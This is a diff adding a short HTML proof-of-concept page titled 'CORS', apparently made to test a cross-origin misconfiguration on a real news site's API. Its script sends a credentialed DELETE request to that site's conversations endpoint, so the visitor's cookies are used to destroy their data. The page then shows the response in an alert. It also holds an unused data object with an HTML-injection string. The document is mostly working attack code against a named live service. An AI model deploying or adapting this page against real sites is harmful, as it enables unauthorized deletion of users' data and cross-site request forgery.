@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS</title>
+</head>
+<body>
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('DELETE','https://go.welt.de/api/conversations','true');
+    data = {"first_name":"shadow\"><p>","last_name":"ahmed","country":"US","phone":"+19802165484","smsOptIn":true}
+    req.setRequestHeader("Content-Type", "application/json");
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+    alert(this.responseText) 
+};
+    
+    </script>
+</body>
+</html>
